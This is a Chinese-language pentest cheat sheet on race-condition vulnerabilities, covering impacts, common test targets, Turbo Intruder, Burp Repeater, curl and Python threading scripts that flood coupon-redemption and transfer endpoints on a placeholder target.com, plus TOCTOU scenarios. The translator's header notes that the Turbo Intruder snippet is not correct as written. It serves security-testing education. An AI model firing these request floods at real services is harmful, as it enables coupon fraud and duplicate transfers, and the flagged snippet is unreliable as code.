# ⚡ 竞态条件速查表

<!-- language-home-navigation -->
[🏠 中文首页](../../README.zh-CN.md) • [🌐 Languages](../../README.md#-available-languages)

> **示例勘误：** 下方 Turbo Intruder 代码保留原文，但官方回调示例是 `handleResponse(req, interesting)`，向结果表加入的是 `req`；原文把第二个参数当成带 `.status` 的响应对象，并调用 `table.add(response)`，不能直接视为可运行的正确示例。参见 [Turbo Intruder 官方示例](https://github.com/PortSwigger/turbo-intruder/blob/master/resources/examples/default.py)。 原文若指 [RacePWN 项目](https://github.com/racepwn/racepwn)，其核心库使用 C，命令行工具使用 Go，并非单纯的 Python 工具。
>
> **同步与验证说明：** 多连接、HTTP 流水线或循环启动线程并不保证请求同时进入服务端关键区。协议、连接复用与同步机制都会影响竞态窗口；参见 [官方同步请求示例](https://github.com/PortSwigger/turbo-intruder/blob/master/resources/examples/race-single-packet-attack.py) 和 [Repeater 请求组说明](https://portswigger.net/burp/documentation/desktop/tools/repeater/send-group)。优惠券、转账及下载结果均为条件性场景，是否存在漏洞应以服务端最终状态和业务约束是否被破坏为准，不能仅凭 HTTP 200 判断。参见 [PortSwigger 竞态条件教程](https://portswigger.net/web-security/race-conditions)。

<p align="center">
  <a href="README.tr.md">🇹🇷 Türkçe Sürüm</a> • <a href="README.el.md">🇬🇷 Ελληνικά</a>
</p>

```
  ██████╗  █████╗  ██████╗███████╗     ██████╗ ██████╗ ███╗   ██╗██████╗ ██╗████████╗██╗ ██████╗ ███╗   ██╗███████╗
  ██╔══██╗██╔══██╗██╔════╝██╔════╝    ██╔════╝██╔═══██╗████╗  ██║██╔══██╗██║╚══██╔══╝██║██╔═══██╗████╗  ██║██╔════╝
  ██████╔╝███████║██║     █████╗      ██║     ██║   ██║██╔██╗ ██║██║  ██║██║   ██║   ██║██║   ██║██╔██╗ ██║███████╗
  ██╔══██╗██╔══██║██║     ██╔══╝      ██║     ██║   ██║██║╚██╗██║██║  ██║██║   ██║   ██║██║   ██║██║╚██╗██║╚════██║
  ██║  ██║██║  ██║╚██████╗███████╗    ╚██████╗╚██████╔╝██║ ╚████║██████╔╝██║   ██║   ██║╚██████╔╝██║ ╚████║███████║
  ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚══════╝     ╚═════╝ ╚═════╝ ╚═╝  ╚═══╝╚═════╝ ╚═╝   ╚═╝   ╚═╝ ╚═════╝ ╚═╝  ╚═══╝╚══════╝
```

---

## 🎯 什么是竞态条件

**竞态条件（Race Conditions）** 指操作执行的时序可能被利用，例如先检查、后使用（check-then-use）流程中存在的漏洞。

### 影响
- 💰 **金融欺诈** - 重复兑换
- 🎫 **优惠券滥用** - 多次兑换同一优惠码
- 👤 **权限提升** - 绕过检查
- 📂 **文件覆盖** - TOCTOU（检查时与使用时不一致）攻击

---

## 🔍 常见测试目标

```
- 优惠券或促销码兑换
- 投票或点赞系统
- 转账
- 存在次数或额度限制的操作
- 文件上传
- 密码重置
- 双因素认证（2FA）验证
- 账户注册
```

---

## 💉 漏洞利用技术

### Burp Suite Turbo Intruder

```python
# 同时多次发送请求（实际同步程度见译注）
def queueRequests(target, wordlists):
    engine = RequestEngine(
        endpoint=target.endpoint,
        concurrentConnections=30,
        requestsPerConnection=100,
        pipeline=True
    )
    
    for i in range(30):
        engine.queue(target.req)

def handleResponse(req, response):
    if '200' in response.status:
        table.add(response)
```

### Burp Repeater（手动）
```
1. 将请求发送到 Repeater
2. 复制选项卡 20+ 次
3. 创建选项卡组
4. 点击“Send group (parallel)”（并行发送请求组）
```

### curl 并行请求
```bash
# 发送 20 个并行请求
seq 1 20 | xargs -P 20 -I {} curl -s https://target.com/redeem?code=PROMO123

# 携带 POST 数据
for i in {1..20}; do
  curl -X POST https://target.com/transfer \
    -d "amount=100&to=attacker" &
done
wait
```

### Python 多线程
```python
import threading
import requests

def exploit():
    r = requests.post("https://target.com/redeem", 
                      data={"code": "PROMO50"})
    print(r.status_code)

threads = []
for i in range(50):
    t = threading.Thread(target=exploit)
    threads.append(t)

# 同时启动所有线程（线程启动并不等于请求严格同步）
for t in threads:
    t.start()

for t in threads:
    t.join()
```

---

## 📊 常见场景

### 优惠码竞态
```
1. 优惠券 = 50% 折扣
2. 正常情况：只能兑换一次
3. 竞态情况：同时兑换 10x
4. 结果：10 笔订单均享受 50% 折扣
```

### 绕过次数限制
```
1. 限制：每日下载 3 次
2. 竞态情况：同时发起 10 次下载请求
3. 检查同时进行
4. 结果：在限制生效前，10 次下载全部成功
```

### 文件上传竞态（TOCTOU）
```
1. 上传文件 → 检查结果为安全
2. 移动文件之前，将其替换为恶意文件
3. 服务器最终移动了恶意文件
```

---

## 🛠️ 工具

| 工具 | 用途 |
|------|---------|
| **Turbo Intruder** | 用于发送并行请求的 Burp 扩展 |
| **race-the-web** | 用于竞态条件测试的 Go 工具 |
| **racepwn** | 用于竞态条件测试的 Python 工具（原文标注，项目区别见译注） |

---

## 📚 参考资源

- [PortSwigger 竞态条件教程](https://portswigger.net/web-security/race-conditions)
- [OWASP TOCTOU](https://owasp.org/www-community/vulnerabilities/Time_of_check_to_time_of_use)

---

<p align="center">
  <b>⚡ 利用时序差异！</b><br>
  <i>仅用于获得授权的测试！</i>
</p>
